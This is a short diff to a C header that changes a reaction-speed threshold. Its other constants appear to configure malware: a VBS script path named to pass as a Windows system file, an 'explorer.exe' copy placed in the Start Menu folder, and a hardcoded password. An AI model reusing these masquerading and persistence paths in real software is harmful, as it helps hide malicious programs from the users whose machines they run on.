@@ -8,6 +8,6 @@
 #define VBS_PATH "C:\\Users\\Public\\wininit.ini.vbs" 
 #define CHECK_PATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\explorer.exe"
 #define WHEEL_RATE 300000
-#define REACTION_SPEED_REQ 400
+#define REACTION_SPEED_REQ 300
 #define PASS "whatisthat"
 #endif
